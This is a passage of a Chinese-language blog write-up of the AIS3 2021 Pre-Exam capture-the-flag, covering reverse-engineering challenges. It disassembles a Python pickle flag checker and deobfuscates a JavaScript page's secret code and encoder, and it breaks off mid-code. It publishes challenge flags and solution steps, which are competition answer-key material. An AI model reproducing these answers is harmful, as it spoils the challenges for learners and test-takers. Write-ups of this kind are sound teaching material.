@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html lang="zh-tw">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="zh-tw">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="x2w">
+    <meta name="description" content="雖然只有解出每個領域的簡單題目
+還是厚著臉皮寫一下Writeup好了
+反正抽查也被抽中了Q_Q
+ REVERSE    Piano    題目是一個.NET的exe檔。
+只要是.NET一律丟進dnSpy反編譯。
+ 🐰Peekora🥒    題目是一個Python Pickle檔：flag_checker.pkl
+可以用 python -m pickle flag_checker.pkl 執行它
+並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)
+輸入錯誤的話會直接exit, 不讓你用pickle把它load完。
+只能乖乖做靜態分析了
+python -m pickletools -a flag_checker.pkl
+0: c GLOBAL &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack. 19: ( MARK Push markobject onto the stack. 20: S STRING &#39;FLAG: &#39; Push a Python string object. 30: t TUPLE (MARK at 19) Build a tuple out of the topmost stack slice, after markobject.">
+    <meta name="keywords" content="">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="AIS3 2021 Pre-Exam Writeup"/>
+<meta name="twitter:description" content="雖然只有解出每個領域的簡單題目
+還是厚著臉皮寫一下Writeup好了
+反正抽查也被抽中了Q_Q
+ REVERSE    Piano    題目是一個.NET的exe檔。
+只要是.NET一律丟進dnSpy反編譯。
+ 🐰Peekora🥒    題目是一個Python Pickle檔：flag_checker.pkl
+可以用 python -m pickle flag_checker.pkl 執行它
+並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)
+輸入錯誤的話會直接exit, 不讓你用pickle把它load完。
+只能乖乖做靜態分析了
+python -m pickletools -a flag_checker.pkl
+0: c GLOBAL &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack. 19: ( MARK Push markobject onto the stack. 20: S STRING &#39;FLAG: &#39; Push a Python string object. 30: t TUPLE (MARK at 19) Build a tuple out of the topmost stack slice, after markobject."/>
+
+    <meta property="og:title" content="AIS3 2021 Pre-Exam Writeup" />
+<meta property="og:description" content="雖然只有解出每個領域的簡單題目
+還是厚著臉皮寫一下Writeup好了
+反正抽查也被抽中了Q_Q
+ REVERSE    Piano    題目是一個.NET的exe檔。
+只要是.NET一律丟進dnSpy反編譯。
+ 🐰Peekora🥒    題目是一個Python Pickle檔：flag_checker.pkl
+可以用 python -m pickle flag_checker.pkl 執行它
+並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)
+輸入錯誤的話會直接exit, 不讓你用pickle把它load完。
+只能乖乖做靜態分析了
+python -m pickletools -a flag_checker.pkl
+0: c GLOBAL &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack. 19: ( MARK Push markobject onto the stack. 20: S STRING &#39;FLAG: &#39; Push a Python string object. 30: t TUPLE (MARK at 19) Build a tuple out of the topmost stack slice, after markobject." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/ais3_2021_pre_exam_writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-25T17:23:15&#43;08:00" />
+<meta property="article:modified_time" content="2021-05-25T17:23:15&#43;08:00" />
+
+
+
+    <title>
+  AIS3 2021 Pre-Exam Writeup · SLOTH
+</title>
+
+    
+      <link rel="canonical" href="/posts/ais3_2021_pre_exam_writeup/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.93c41bf1e522f85ecda7355985f09000f71fc1d64dda9f74051b0fa06210e93f.css" integrity="sha256-k8Qb8eUi&#43;F7NpzVZhfCQAPcfwdZN2p90BRsPoGIQ6T8=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+
+    <meta name="generator" content="Hugo 0.83.1" />
+  </head>
+
+  
+  
+  <body class="preload-transitions colorscheme-light"
+        onload=""
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      SLOTH
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="/posts/ais3_2021_pre_exam_writeup/">
+              AIS3 2021 Pre-Exam Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-05-25T17:23:15&#43;08:00'>
+                May 25, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              閱讀時間 10 分鐘
+            </span>
+          </div>
+          
+          
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/ctf/">CTF</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/ais3/">AIS3</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <p>雖然只有解出每個領域的簡單題目</p>
+<p>還是厚著臉皮寫一下Writeup好了</p>
+<p>反正抽查也被抽中了Q_Q</p>
+<hr>
+<h1 id="reverse">
+  REVERSE
+  <a class="heading-link" href="#reverse">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="piano">
+  Piano
+  <a class="heading-link" href="#piano">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>題目是一個.NET的exe檔。</p>
+<p>只要是.NET一律丟進dnSpy反編譯。</p>
+<hr>
+<h2 id="peekora">
+  🐰Peekora🥒
+  <a class="heading-link" href="#peekora">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>題目是一個Python Pickle檔：flag_checker.pkl</p>
+<p>可以用 python -m pickle flag_checker.pkl 執行它</p>
+<p>並且如名字所示, 成功輸入flag就會print(&ldquo;Correct!&quot;)</p>
+<p>輸入錯誤的話會直接exit, 不讓你用pickle把它load完。</p>
+<p>只能乖乖做靜態分析了</p>
+<p><code>python -m pickletools -a flag_checker.pkl</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">    0: c    GLOBAL     &#39;__builtin__ input&#39; Push a global object (module.attr) on the stack.
+   19: (    MARK                           Push markobject onto the stack.
+   20: S        STRING     &#39;FLAG: &#39;        Push a Python string object.
+   30: t        TUPLE      (MARK at 19)    Build a tuple out of the topmost stack slice, after markobject.
+   31: R    REDUCE                         Push an object built from a callable and an argument tuple.
+   32: p    PUT        0                   Store the stack top into the memo.  The stack is not popped.
+   35: 0    POP                            Discard the top stack item, shrinking the stack by one item.
+   36: c    GLOBAL     &#39;__builtin__ getattr&#39; Push a global object (module.attr) on the stack.
+   57: p    PUT        1                     Store the stack top into the memo.  The stack is not popped.
+   60: 0    POP                              Discard the top stack item, shrinking the stack by one item.
+   61: g    GET        1                     Read an object from the memo and push it on the stack.
+   64: (    MARK                             Push markobject onto the stack.
+   65: (        MARK                         Push markobject onto the stack.
+   66: c            GLOBAL     &#39;__builtin__ exit&#39; Push a global object (module.attr) on the stack.
+   84: c            GLOBAL     &#39;__builtin__ str&#39;  Push a global object (module.attr) on the stack.
+  101: l            LIST       (MARK at 65)       Build a list out of the topmost stack slice, after markobject.
+  102: S        STRING     &#39;__getitem__&#39;          Push a Python string object.
+  117: t        TUPLE      (MARK at 64)           Build a tuple out of the topmost stack slice, after markobject.
+  118: R    REDUCE                                Push an object built from a callable and an argument tuple.
+  119: p    PUT        2                          Store the stack top into the memo.  The stack is not popped.
+  122: 0    POP                                   Discard the top stack item, shrinking the stack by one item.
+  123: g    GET        2                          Read an object from the memo and push it on the stack.
+  126: (    MARK                                  Push markobject onto the stack.
+  127: g        GET        1                      Read an object from the memo and push it on the stack.
+  130: (        MARK                              Push markobject onto the stack.
+  131: g            GET        0                  Read an object from the memo and push it on the stack.
+  134: S            STRING     &#39;startswith&#39;       Push a Python string object.
+  148: t            TUPLE      (MARK at 130)      Build a tuple out of the topmost stack slice, after markobject.
+  149: R        REDUCE                            Push an object built from a callable and an argument tuple.
+  150: (        MARK                              Push markobject onto the stack.
+  151: S            STRING     &#39;AIS3{&#39;            Push a Python string object.
+  160: t            TUPLE      (MARK at 150)      Build a tuple out of the topmost stack slice, after markobject.
+  161: R        REDUCE                            Push an object built from a callable and an argument tuple.
+  162: t        TUPLE      (MARK at 126)          Build a tuple out of the topmost stack slice, after markobject.
+  163: R    REDUCE                                Push an object built from a callable and an argument tuple.
+# 以下略...
+</code></pre></div><p>沒什麼好說的，就是大部分直譯語言執行期的架構，用stack呼叫函數</p>
+<p>pickletools 有幫忙把段落indent真的是幫了大忙。</p>
+<p>接下來就要使用<em>超凡的意志力</em>盯著它看，</p>
+<p>然後悟出flag會經過以下的test：</p>
+<ul>
+<li>flag.startswith(&lsquo;AIS3{')</li>
+<li>flag.endswith('}')</li>
+<li>flag[6] == &lsquo;A&rsquo;</li>
+<li>flag[9] == &lsquo;j&rsquo;</li>
+<li>flag[11] == &lsquo;p&rsquo;</li>
+<li>flag[14] == key[9]</li>
+<li>flag[5] == &rsquo;d&rsquo;</li>
+<li>flag[10] == &lsquo;z&rsquo;</li>
+<li>flag[12] == &lsquo;h&rsquo;</li>
+<li>flag[13] == key[1]</li>
+<li>flag[8] == &lsquo;w&rsquo;</li>
+<li>flag[7] == &rsquo;m'</li>
+</ul>
+<p>所以最後拼出來的flag是</p>
+<p><code>AIS3{dAmwjzphIj}</code></p>
+<hr>
+<h2 id="colors">
+  Colors
+  <a class="heading-link" href="#colors">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>題目連結是這個網頁，馬上有不好的預感會是Reverse JS題</p>
+<figure><img src="/img/ais3_2021/pre_exam/colors01.png"/>
+</figure>
+
+<p>前10個字母的html長這樣(很重要，等一下會考)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c0 r0&#34;</span>&gt;i&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c0 r0&#34;</span>&gt;n&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c0 r0&#34;</span>&gt;p&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c0 r0&#34;</span>&gt;u&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c0 r0&#34;</span>&gt;t&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c1 r0&#34;</span>&gt;s&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c1 r0&#34;</span>&gt;e&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c1 r0&#34;</span>&gt;c&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c1 r0&#34;</span>&gt;r&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c1 r0&#34;</span>&gt;e&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+&lt;<span style="color:#f92672">span</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c1 r0&#34;</span>&gt;t&lt;/<span style="color:#f92672">div</span>&gt;&lt;/<span style="color:#f92672">span</span>&gt;
+</code></pre></div><p>然後題目的Javascript有做obfuscation，所以真的有夠醜。</p>
+<p>經過一些簡化以及重新命名後，有關secret code的邏輯：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">TAG</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">cid</span>,<span style="color:#a6e22e">rid</span>,<span style="color:#a6e22e">chr</span>)=&gt;<span style="color:#e6db74">&#39;&lt;span&gt;&lt;div\x20class=\x22c&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">cid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x20r&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x22&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">chr</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&lt;/span&gt;&#39;</span>
+      , <span style="color:#a6e22e">update</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">INPUT</span>=&gt;document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#a6e22e">f2</span>(<span style="color:#ae81ff">0x1cc</span>))[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">dostuff</span>(<span style="color:#a6e22e">INPUT</span>);
+    document[<span style="color:#e6db74">&#39;addEventListener&#39;</span>](<span style="color:#e6db74">&#39;keydown&#39;</span>, <span style="color:#a6e22e">LISTENER</span>=&gt;{
+        <span style="color:#66d9ef">const</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x12b963</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2</span>;
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Backspace&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xa</span>)
+            <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>][<span style="color:#e6db74">&#39;substr&#39;</span>](<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>);
+        <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowUp&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1</span>))
+                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
+            <span style="color:#66d9ef">else</span> {
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowDown&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x2</span>))
+                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
+                <span style="color:#66d9ef">else</span> {
+                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowLeft&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6</span>))
+                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
+                    <span style="color:#66d9ef">else</span> {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;ArrowRight&#39;</span> <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7</span>))
+                            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
+                        <span style="color:#66d9ef">else</span> {
+                            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8</span>)
+                                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
+                            <span style="color:#66d9ef">else</span> {
+                                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x9</span>)
+                                    <span style="color:#66d9ef">return</span> document[<span style="color:#e6db74">&#39;getElementsByTagName&#39;</span>](<span style="color:#e6db74">&#39;body&#39;</span>)[<span style="color:#ae81ff">0x0</span>][<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">+=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b1</span>),
+                                    <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span> <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#e6db74">&#39;input&#39;</span>),
+                                    <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#75715e">// unlock input
+</span><span style="color:#75715e"></span>                                    document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#e6db74">&#39;output&#39;</span>)[<span style="color:#e6db74">&#39;innerHTML&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">atob</span>(<span style="color:#a6e22e">b2</span>)[<span style="color:#e6db74">&#39;match&#39;</span>](<span style="color:#e6db74">/(.{1,3})/g</span>)[<span style="color:#e6db74">&#39;map&#39;</span>](<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>=&gt;<span style="color:#a6e22e">TAG</span>(<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x0</span>], <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x1</span>], <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x5efa9e</span>[<span style="color:#ae81ff">0x2</span>]))[<span style="color:#e6db74">&#39;join&#39;</span>](<span style="color:#e6db74">&#39;&#39;</span>),
+                                    <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1</span>;
+                                <span style="color:#66d9ef">else</span> {
+                                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">SEQ</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xa</span>)
+                                        <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>] <span style="color:#f92672">+=</span> String[<span style="color:#e6db74">&#39;fromCharCode&#39;</span>](<span style="color:#a6e22e">LISTENER</span>[<span style="color:#e6db74">&#39;key&#39;</span>][<span style="color:#e6db74">&#39;charCodeAt&#39;</span>]());
+                                    <span style="color:#66d9ef">else</span>
+                                        <span style="color:#66d9ef">return</span>;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        <span style="color:#a6e22e">update</span>(<span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x1e21d9</span>[<span style="color:#e6db74">&#39;textContent&#39;</span>]);
+    }
+</code></pre></div><p>基本上就是從EventListener抓你輸入的十個key</p>
+<p>可以看出secret code是 <strong>↑↑↓↓←←→→ba</strong></p>
+<p>輸入secret code後還不放過你：</p>
+<figure><img src="/img/ais3_2021/pre_exam/colors02.png"/>
+</figure>
+
+<p>接下來我們可以輸入任意字串，然後給我們看encode後的結果</p>
+<p>寫出decoder後應該就能還原flag了</p>
+<p>先來看看他的encoding邏輯：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">TAG</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">cid</span>,<span style="color:#a6e22e">rid</span>,<span style="color:#a6e22e">chr</span>)=&gt;<span style="color:#e6db74">&#39;&lt;span&gt;&lt;div\x20class=\x22c&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">cid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x20r&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rid</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\x22&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">chr</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&lt;/span&gt;&#39;</span>;
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">b3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2</span>(<span style="color:#ae81ff">0x1d4</span>);
+<span style="color:#75715e">// atob(b3) === &#34;AlS3{BasE64_i5+b0rNIng~\\Qwo/-xH8WzCj7vFD2eyVktqOL1GhKYufmZdJpX9}&#34; // 64
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">encode</span>(<span style="color:#a6e22e">INPUT</span>) {
+    <span style="color:#66d9ef">const</span> <span style="color:#ae81ff">_0</span><span style="color:#a6e22e">x9fe181</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f2</span>;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">INPUT</span>[<span style="color:#e6db74">&#39;length&#39;</span>])
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">BIN</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+      , <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+      , <span style="color:#a6e22e">rest</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">INPUT</span>[<span style="color:#e6db74">&#39;length&#39;</span>]; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
+		<span style="color:#75715e">// appends ASCII bin string for each char in input
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">BIN</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">INPUT</span>[<span style="color:#e6db74">&#39;charCodeAt&#39;</span>](<span style="color:#a6e22e">i</span>)[<span style="color:#e6db74">&#39;toString&#39;</span>](<span style="color:#ae81ff">0x2</span>)[<span style="color:#e6db74">&#39;padStart&#39;</span>](<span style="color:#ae81ff">0x8</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
+    <span style="color:#a6e22e">rest</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BIN</span>[<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">%</span> <span style="color:#a6e22e">ten</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1</span>;
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rest</span> <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1</span>)
+		<span style="color:#75715e">// pad the bin string to a multiple of ten
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">BIN</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span>[<span style="color:#e6db74">&#39;repeat&#39;</span>](<span style="color:#a6e22e">ten</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">BIN</span>[<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">%</span> <span style="color:#a6e22e">ten</span>);
+	<span style="color:#75715e">// split into sections of 10 bits
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">BIN</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BIN</span>[<span style="color:#e6db74">&#39;match&#39;</span>](<span style="color:#e6db74">/(.{1,10})/g</span>);
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">section</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">BIN</span>) {
+		<span style="color:#75715e">// x from 0 to 1023
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">section</span>, <span style="color:#ae81ff">0x2</span>);
